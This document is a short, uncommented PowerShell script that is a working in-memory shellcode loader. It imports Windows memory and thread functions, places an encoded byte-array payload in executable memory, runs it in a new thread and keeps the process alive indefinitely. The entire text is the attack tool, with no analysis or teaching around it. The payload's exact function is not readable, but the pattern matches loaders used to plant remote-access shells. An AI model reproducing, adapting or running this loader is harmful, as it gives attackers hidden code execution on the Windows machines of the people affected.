
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc1,0xba,0xe0,0xef,0x48,0x9f,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x49,0x83,0xee,0xfc,0x31,0x56,0x15,0x03,0x56,0x15,0x02,0x1a,0xb4,0x77,0x4b,0xe5,0x45,0x88,0x2b,0x6f,0xa0,0xb9,0x79,0x0b,0xa0,0xe8,0x4d,0x5f,0xe4,0x00,0x26,0x0d,0x1d,0x92,0x4a,0x9a,0x12,0x13,0xe0,0xfc,0x1d,0xa4,0xc5,0xc0,0xf2,0x66,0x44,0xbd,0x08,0xbb,0xa6,0xfc,0xc2,0xce,0xa7,0x39,0x3e,0x20,0xf5,0x92,0x34,0x93,0xe9,0x97,0x09,0x28,0x08,0x78,0x06,0x10,0x72,0xfd,0xd9,0xe5,0xc8,0xfc,0x09,0x55,0x47,0xb6,0xb1,0xdd,0x0f,0x67,0xc3,0x32,0x4c,0x5b,0x8a,0x3f,0xa6,0x2f,0x0d,0x96,0xf7,0xd0,0x3f,0xd6,0x5b,0xef,0x8f,0xdb,0xa2,0x37,0x37,0x04,0xd1,0x43,0x4b,0xb9,0xe1,0x97,0x31,0x65,0x64,0x0a,0x91,0xee,0xde,0xee,0x23,0x22,0xb8,0x65,0x2f,0x8f,0xcf,0x22,0x2c,0x0e,0x1c,0x59,0x48,0x9b,0xa3,0x8e,0xd8,0xdf,0x87,0x0a,0x80,0x84,0xa6,0x0b,0x6c,0x6a,0xd7,0x4c,0xc8,0xd3,0x7d,0x06,0xfb,0x00,0x07,0x45,0x94,0xe5,0x35,0x76,0x64,0x62,0x4e,0x05,0x56,0x2d,0xe4,0x81,0xda,0xa6,0x22,0x55,0x1c,0x9d,0x92,0xc9,0xe3,0x1e,0xe2,0xc0,0x27,0x4a,0xb2,0x7a,0x81,0xf3,0x59,0x7b,0x2e,0x26,0xcd,0x2b,0x80,0x99,0xad,0x9b,0x60,0x4a,0x45,0xf6,0x6e,0xb5,0x75,0xf9,0xa4,0xde,0x1f,0x03,0x2f,0x24,0xaa,0xba,0x51,0xce,0x56,0xbd,0xbc,0x53,0xdf,0x5b,0xd4,0x7b,0x89,0xf4,0x41,0xe5,0x90,0x8f,0xf0,0xea,0x0f,0xea,0x33,0x60,0xa3,0x0a,0xfd,0x81,0xce,0x18,0x6a,0x62,0x85,0x43,0x3d,0x7d,0x30,0xe9,0xc2,0xeb,0xbe,0xb8,0x95,0x83,0xbc,0x9d,0xd2,0x0b,0x3f,0xc8,0x68,0x85,0xd5,0xb3,0x06,0xea,0x39,0x34,0xd7,0xbc,0x53,0x34,0xbf,0x18,0x07,0x67,0xda,0x66,0x92,0x1b,0x77,0xf3,0x1c,0x4a,0x2b,0x54,0x74,0x70,0x12,0x92,0xdb,0x8b,0x71,0x22,0x20,0x5a,0xbc,0xa0,0x50,0xe8,0xac,0x68;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

